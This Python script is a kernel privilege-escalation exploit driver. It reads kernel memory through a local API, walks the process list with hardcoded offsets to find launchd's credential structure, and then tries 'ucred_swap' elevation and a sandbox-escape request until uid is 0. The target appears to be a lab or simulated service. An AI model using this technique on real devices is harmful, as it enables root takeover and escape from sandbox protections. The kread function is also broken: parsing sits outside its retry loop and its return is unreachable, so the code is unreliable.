#!/usr/bin/env python3
"""final_ucred_swap.py

Find launchd ucred by walking proc list from kernproc and attempt API ucred_swap.
Only uses kread (POST /api/v1/kread) and elevate endpoints (GET/POST). No kwrite.
"""
import os
import sys
import time
import struct
import requests

API_BASE = os.environ.get("API_BASE", "http://127.0.0.1:8000")
TIMEOUT = 15.0
KREAD_RETRIES = 3


def panic(msg):
    print(msg)
    sys.exit(1)


def api_post(path, json=None):
    url = API_BASE + path
    try:
        r = requests.post(url, json=json, timeout=TIMEOUT)
        r.raise_for_status()
        return r.json()
    except requests.exceptions.ConnectionError:
        print("[CRITICAL]  CRASHED: Connection lost during API call.")
        sys.exit(1)
    except requests.RequestException as e:
        print("API POST error:", e)
        return None


def api_get(path, params=None):
    url = API_BASE + path
    try:
        r = requests.get(url, params=params, timeout=TIMEOUT)
        r.raise_for_status()
        return r.json()
    except requests.exceptions.ConnectionError:
        print("[CRITICAL]  CRASHED: Connection lost during API call.")
        sys.exit(1)
    except requests.RequestException as e:
        print("API GET error:", e)
        return None


def kread(addr, size):
    # POST /api/v1/kread {"addr": "0x..", "size": n}
    last_exc = None
    for attempt in range(1, KREAD_RETRIES + 1):
        print(f"Читаю 0x{addr:016x} size={size}... (attempt {attempt}/{KREAD_RETRIES})")
        try:
            resp = api_post("/api/v1/kread", json={"addr": hex(addr), "size": size})
        except SystemExit:
            # api_post already handled connection crash
            raise
        except Exception as e:
            print(f"kread attempt {attempt} failed: {e}")
            last_exc = e
            time.sleep(0.5)
            continue
        if not resp or not isinstance(resp, dict):
            last_exc = RuntimeError("kread: invalid response")
            print(f"kread attempt {attempt} got invalid response")
            time.sleep(0.5)
            continue
    # prefer "value" field
    if "value" in resp:
        val = resp.get("value")
        if isinstance(val, str) and val.startswith("0x"):
            b = bytes.fromhex(val[2:])
        else:
            # fallback: decimal
            dec = int(resp.get("value_dec", 0))
            b = struct.pack("<Q", dec)
    elif "data" in resp:
        d = resp.get("data")
        if isinstance(d, str):
            hexs = d[2:] if d.startswith("0x") else d
            b = bytes.fromhex(hexs)
        elif isinstance(d, list):
            b = bytes(d)
        else:
            raise RuntimeError("kread: unsupported data format")
    else:
        raise RuntimeError("kread: missing value/data")
        if len(b) < size:
            b = b.ljust(size, b"\x00")
        return b[:size]
    # all retries failed
    raise last_exc if last_exc is not None else RuntimeError("kread: failed after retries")


def read_ptr(addr):
    b = kread(addr, 8)
    return struct.unpack("<Q", b)[0]


def read_u32(addr):
    b = kread(addr, 4)
    return struct.unpack("<I", b)[0]


def read_ds():
    print("Читаю /api/v1/ds for kernel info...")
    resp = api_get("/api/v1/ds")
    return resp


def find_launchd_ucred():
    ds = read_ds()
    kernproc = None
    kernel_base = None
    if isinstance(ds, dict):
        # prefer explicit kernproc
        if "kernproc" in ds:
            kernproc = int(ds.get("kernproc"), 0) if isinstance(ds.get("kernproc"), str) else int(ds.get("kernproc"))
        # common key observed: kernel_base
        if "kernel_base" in ds:
            kernel_base = int(ds.get("kernel_base"), 0) if isinstance(ds.get("kernel_base"), str) else int(ds.get("kernel_base"))
        # other variants
        if kernel_base is None and "kernelbase" in ds:
            kernel_base = int(ds.get("kernelbase"), 0) if isinstance(ds.get("kernelbase"), str) else int(ds.get("kernelbase"))
    if kernproc is None:
        if kernel_base is not None:
            kernproc = kernel_base + 0x96B928
            print(f"Derived kernproc = kernel_base + 0x96B928 -> 0x{kernproc:016x}")
        else:
            panic("Не могу получить kernproc or kernel_base from /api/v1/ds")

    print(f"Walking proc list starting at kernproc=0x{kernproc:016x}")
    visited = set()
    cur = kernproc
    max_iters = 20000
    it = 0
    while cur and it < max_iters:
        if cur in visited:
            print("Detected loop in proc list; aborting")
            break
        visited.add(cur)
        # Validate current pointer looks like kernel pointer
        if not hex(cur).startswith("0xffff"):
            panic("Invalid pointer detected: current proc pointer not in kernel space")
        try:
            print(f"Читаю PID по адресу 0x{(cur + 0x28):016x}...")
            pid = read_u32(cur + 0x28)
        except Exception as e:
            print("Ошибка при чтении pid:", e)
            break
        print(f"Получен PID {pid} for proc @0x{cur:016x}")
        if pid == 1:
            print("Нашёл PID 1 (launchd). Получаю proc_ro и ucred")
            proc_ro = read_ptr(cur + 0x18)
            print(f"proc_ro = 0x{proc_ro:016x}")
            ucred = read_ptr(proc_ro + 0x20)
            print(f"launchd_ucred_addr = 0x{ucred:016x}")
            return ucred
        # follow p_list: try offsets 0x0 then 0x8 for le_next
        next_ptr = None
        for off in (0x0, 0x8):
            candidate_addr = cur + off
            try:
                print(f"Читаю следующий указатель по адресу 0x{candidate_addr:016x} (offset 0x{off:x})...")
                candidate = read_ptr(candidate_addr)
            except Exception as e:
                print(f"Ошибка при чтении кандидата le_next at offset 0x{off:x}:", e)
                candidate = None
            if candidate:
                # Validate candidate looks like kernel ptr
                if isinstance(candidate, int) and hex(candidate).startswith("0xffff"):
                    next_ptr = candidate
                    print(f"Следующий указатель принят: 0x{next_ptr:016x}")
                    break
                else:
                    print(f"Некорректный следующий указатель из offset 0x{off:x}: 0x{candidate:x}")
        if not next_ptr:
            panic("Invalid pointer detected: next proc pointer not in kernel space")
        if next_ptr == 0 or next_ptr == cur:
            print("Reached end of list or self-reference; aborting")
            break
        cur = next_ptr
        it += 1
    panic("Не удалось найти launchd proc in proc list")


def try_elevate_variants(ucred_addr_hex):
    # Variant A: GET /api/v1/elevate?method=ucred_swap&target_ucred=<addr>&force=1
    urlA = f"/api/v1/elevate"
    paramsA = {"method": "ucred_swap", "target_ucred": ucred_addr_hex, "force": "1"}
    print(f"Пробую Variant A GET {API_BASE+urlA} params={paramsA}")
    respA = api_get(urlA, params=paramsA)
    print("Ответ Variant A:", respA)
    ids = api_get("/api/v1/ids")
    print("Проверяю /api/v1/ids:", ids)
    if isinstance(ids, dict) and int(ids.get("uid", -1)) == 0:
        print("Успех после Variant A")
        return True

    # Variant B: POST /api/v1/elevate JSON
    print("Пробую Variant B POST /api/v1/elevate")
    respB = api_post("/api/v1/elevate", json={"method": "ucred_swap", "target_ucred": ucred_addr_hex, "force": True})
    print("Ответ Variant B:", respB)
    ids = api_get("/api/v1/ids")
    print("Проверяю /api/v1/ids:", ids)
    if isinstance(ids, dict) and int(ids.get("uid", -1)) == 0:
        print("Успех после Variant B")
        return True

    # Variant C: GET /api/v1/sbx?action=escape&method=ucred_swap&target=launchd
    print("Пробую Variant C GET /api/v1/sbx?action=escape&method=ucred_swap&target=launchd")
    respC = api_get("/api/v1/sbx", params={"action": "escape", "method": "ucred_swap", "target": "launchd"})
    print("Ответ Variant C:", respC)
    ids = api_get("/api/v1/ids")
    print("Проверяю /api/v1/ids:", ids)
    if isinstance(ids, dict) and int(ids.get("uid", -1)) == 0:
        print("Успех после Variant C")
        return True

    return False


def main():
    print("Запускаю final_ucred_swap.py")
    ucred_addr = find_launchd_ucred()
    ucred_hex = hex(ucred_addr)
    print(f"Попытка эскалации с target_ucred={ucred_hex}")
    ok = try_elevate_variants(ucred_hex)
    if ok:
        print("OBTAINED: uid == 0")
        sys.exit(0)
    else:
        print("FAILED: uid != 0 after all variants")
        print("Примечание: если это не сработало, можно пробовать альтернативные векторы.")
        sys.exit(2)


if __name__ == '__main__':
    main()
